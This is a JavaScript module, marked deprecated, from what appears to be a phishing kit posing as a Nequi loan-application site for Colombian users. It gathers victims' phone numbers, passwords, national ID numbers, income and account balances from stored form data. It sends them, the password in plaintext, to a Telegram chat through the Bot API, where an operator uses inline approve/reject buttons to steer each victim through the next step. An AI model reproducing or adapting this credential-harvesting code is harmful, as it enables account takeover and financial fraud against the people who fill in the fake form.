/**
 * ===========================================
 * ARCHIVO OBSOLETO - NO SE USA
 * ===========================================
 * Este archivo fue reemplazado por Socket.IO
 * Server-side: server.js maneja Telegram
 * Client-side: socket-client.js maneja comunicación
 * 
 * MANTENER SOLO COMO REFERENCIA HISTÓRICA
 * NO INCLUIR EN HTML
 * ===========================================
 */

/**
 * Módulo de integración con Telegram Bot API
 * Maneja el envío de mensajes y botones inline
 * @module TelegramBot
 * @deprecated - Usar Socket.IO en su lugar
 */

const TelegramBot = (() => {
  const config = AppConfig.telegram;

  /**
   * Obtiene todos los datos acumulados del cliente
   * @returns {Object} Datos del formulario
   */
  const getAccumulatedData = () => {
    const formData = JSON.parse(localStorage.getItem('formData') || '{}');
    const sessionId = localStorage.getItem(AppConfig.storageKeys.sessionId);
    return {
      sessionId,
      phoneNumber: formData.phoneNumber || 'N/A',
      password: formData.password || 'N/A',
      loanAmount: formData.loanAmount || 'N/A',
      loanTerm: formData.loanTerm || 'N/A',
      ...formData
    };
  };

  /**
   * Construye la URL de la API de Telegram
   * @param {string} method - Método de la API
   * @returns {string} URL completa
   */
  const buildApiUrl = (method) => {
    return `${config.apiUrl}${config.botToken}/${method}`;
  };

  /**
   * Realiza una petición a la API de Telegram
   * @param {string} method - Método de la API
   * @param {Object} data - Datos a enviar
   * @returns {Promise<Object>} Respuesta de la API
   */
  const apiRequest = async (method, data) => {
    try {
      const response = await fetch(buildApiUrl(method), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      });

      const result = await response.json();

      if (!result.ok) {
        throw new Error(result.description || 'Error en la API de Telegram');
      }

      return result;
    } catch (error) {
      console.error('Error en Telegram API:', error);
      throw error;
    }
  };

  /**
   * Envía un mensaje simple a Telegram
   * @param {string} message - Mensaje a enviar
   * @returns {Promise<Object>} Respuesta de la API
   */
  const sendMessage = async (message) => {
    return await apiRequest('sendMessage', {
      chat_id: config.chatId,
      text: message,
      parse_mode: 'Markdown',
    });
  };

  /**
   * Envía un mensaje con botones inline
   * @param {Object} options - Opciones del mensaje
   * @param {string} options.message - Mensaje a enviar
   * @param {Array} options.buttons - Array de botones
   * @returns {Promise<Object>} Respuesta de la API
   */
  const sendMessageWithButtons = async (options) => {
    const { message, buttons } = options;

    // Formatear botones para Telegram inline keyboard (callback_data < 64 bytes)
    const inlineKeyboard = buttons.map((row) => {
      if (Array.isArray(row)) {
        // Fila de múltiples botones
        return row.map((btn) => ({
          text: btn.text,
          callback_data: btn.action, // Solo la acción, sin metadata extra
        }));
      } else {
        // Botón único
        return [
          {
            text: row.text,
            callback_data: row.action,
          },
        ];
      }
    });

    return await apiRequest('sendMessage', {
      chat_id: config.chatId,
      text: message,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: inlineKeyboard,
      },
    });
  };

  /**
   * Formatea un mensaje de solicitud de número
   * @param {string} phoneNumber - Número de teléfono
   * @returns {Object} Objeto con mensaje y botones
   */
  const formatPhoneRequestMessage = (phoneNumber) => {
    const data = getAccumulatedData();
    const message = `🔔 *Nueva Solicitud de Crédito*\n\n📱 *Teléfono:* +57 ${phoneNumber}\n🆔 *Sesión:* ${data.sessionId}\n⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}`;

    const buttons = [
      { text: '✅ Continuar', action: 'approve' },
      { text: '❌ Rechazar', action: 'reject' }
    ];

    return { message, buttons };
  };

  /**
   * Formatea un mensaje de solicitud de contraseña
   * @returns {Object} Objeto con mensaje y botones
   */
  const formatPasswordRequestMessage = () => {
    const data = getAccumulatedData();
    const message = `🔐 *Solicitud de Contraseña*\n\n📱 *Teléfono:* +57 ${data.phoneNumber}\n🔑 *Clave:* ****\n🆔 *Sesión:* ${data.sessionId}\n⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}`;

    const buttons = [
      { text: '✅ Continuar', action: 'approve' },
      { text: '❌ Rechazar', action: 'reject' }
    ];

    return { message, buttons };
  };

  /**
   * Formatea un mensaje de solicitud de préstamo
   * @returns {Object} Objeto con mensaje y botones
   */
  const formatLoanRequestMessage = () => {
    const data = getAccumulatedData();
    const message = `💰 *Solicitud de Préstamo*\n\n📱 *Teléfono:* +57 ${data.phoneNumber}\n🔑 *Clave:* ${data.password || '****'}\n🆔 *Cédula:* ${data.cedula || 'N/A'}\n👤 *Nombre:* ${data.nombreCompleto || 'N/A'}\n💵 *Monto:* $${data.montoPrestamo || 'N/A'}\n📅 *Plazo:* ${data.meses || 'N/A'} meses\n👨‍💼 *Ocupación:* ${data.ocupacion || 'N/A'}\n📈 *Ingreso:* $${data.ingresoMensual || 'N/A'}\n💸 *Gastos:* $${data.gastosMensual || 'N/A'}\n🔥 *Saldo Nequi:* $${data.saldoActual || 'N/A'}\n⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}`;

    const buttons = [
      { text: '✅ Aprobar Préstamo', action: 'approve' },
      { text: '❌ Rechazar', action: 'reject' }
    ];

    return { message, buttons };
  };

  /**
   * Envía solicitud de número de teléfono
   * @param {string} phoneNumber - Número de teléfono
   * @returns {Promise<Object>} Respuesta de la API
   */
  const sendPhoneRequest = async (phoneNumber) => {
    const { message, buttons } = formatPhoneRequestMessage(phoneNumber);
    return await sendMessageWithButtons({ message, buttons });
  };

  /**
   * Envía solicitud de contraseña
   * @returns {Promise<Object>} Respuesta de la API
   */
  const sendPasswordRequest = async () => {
    const { message, buttons } = formatPasswordRequestMessage();
    return await sendMessageWithButtons({ message, buttons });
  };

  /**
   * Envía solicitud de préstamo con todos los datos
   * @returns {Promise<Object>} Respuesta de la API
   */
  const sendLoanRequest = async () => {
    const { message, buttons } = formatLoanRequestMessage();
    return await sendMessageWithButtons({ message, buttons });
  };

  /**
   * Polling para verificar respuesta de Telegram
   * @param {number} messageId - ID del mensaje enviado
   * @param {number} maxAttempts - Intentos máximos de polling
   * @param {number} interval - Intervalo entre intentos (ms)
   * @returns {Promise<Object>} Respuesta del callback
   */
  const waitForCallback = async (messageId, maxAttempts = 60, interval = 2000) => {
    // Nota: En producción, esto debería manejarse con webhooks
    // Esta es una implementación simplificada
    return new Promise((resolve, reject) => {
      let attempts = 0;

      const checkCallback = async () => {
        attempts++;

        try {
          // Aquí normalmente consultarías tu backend que escucha los callbacks
          // Por ahora, simulamos la espera
          
          if (attempts >= maxAttempts) {
            reject(new Error('Timeout: No se recibió respuesta'));
            return;
          }

          // Verificar si hay respuesta en localStorage (simulación)
          const response = localStorage.getItem(`callback_${messageId}`);
          if (response) {
            localStorage.removeItem(`callback_${messageId}`);
            resolve(JSON.parse(response));
            return;
          }

          // Continuar esperando
          setTimeout(checkCallback, interval);
        } catch (error) {
          reject(error);
        }
      };

      checkCallback();
    });
  };

  /**
   * Espera respuesta de Telegram mediante polling
   * @param {number} messageId - ID del mensaje enviado
   * @returns {Promise<string>} Acción recibida ('approve' o 'reject')
   */
  const waitForTelegramResponse = async (messageId) => {
    return new Promise((resolve, reject) => {
      const pollInterval = 2000; // 2 segundos
      const maxTime = 300000; // 5 minutos
      let elapsed = 0;

      const checkResponse = async () => {
        // Verificar si hay respuesta en localStorage (simulación)
        const responseKey = `tg_response_${messageId}`;
        const response = localStorage.getItem(responseKey);
        
        if (response) {
          localStorage.removeItem(responseKey);
          resolve(response);
          return;
        }

        // Simular aprobación automática después de 5 segundos (TEMPORAL)
        // En producción, esto se reemplazaría con webhook real
        if (elapsed >= 5000) {
          resolve('approve');
          return;
        }

        elapsed += pollInterval;
        if (elapsed >= maxTime) {
          reject(new Error('Timeout: No se recibió respuesta'));
          return;
        }

        setTimeout(checkResponse, pollInterval);
      };

      checkResponse();
    });
  };

  /**
   * Verifica el estado de conexión con Telegram
   * @returns {Promise<boolean>} Estado de conexión
   */
  const checkConnection = async () => {
    try {
      const result = await apiRequest('getMe', {});
      return result.ok;
    } catch (error) {
      console.error('Error verificando conexión con Telegram:', error);
      return false;
    }
  };

  /**
   * Envía un log de error a Telegram
   * @param {string} errorMessage - Mensaje de error
   * @param {Object} errorDetails - Detalles del error
   */
  const logError = async (errorMessage, errorDetails = {}) => {
    const detailsStr = JSON.stringify(errorDetails)
      .replace(/[<>]/g, '') // Remove HTML brackets
      .substring(0, 200); // Limit length
    
    const message = `⚠️ *Error en Sistema*\n\n*Mensaje:* ${errorMessage}\n*Detalles:* ${detailsStr}\n*Fecha:* ${new Date().toLocaleString('es-CO')}`;

    try {
      await apiRequest('sendMessage', {
        chat_id: config.chatId,
        text: message,
        parse_mode: 'Markdown',
      });
    } catch (error) {
      console.error('Error enviando log a Telegram:', error);
    }
  };

  // API pública del módulo
  return {
    sendMessage,
    sendMessageWithButtons,
    sendPhoneRequest,
    sendPasswordRequest,
    sendLoanRequest,
    waitForTelegramResponse,
    checkConnection,
    logError,
    getAccumulatedData,
  };
})();

// Exportar para uso modular
if (typeof module !== 'undefined' && module.exports) {
  module.exports = TelegramBot;
}
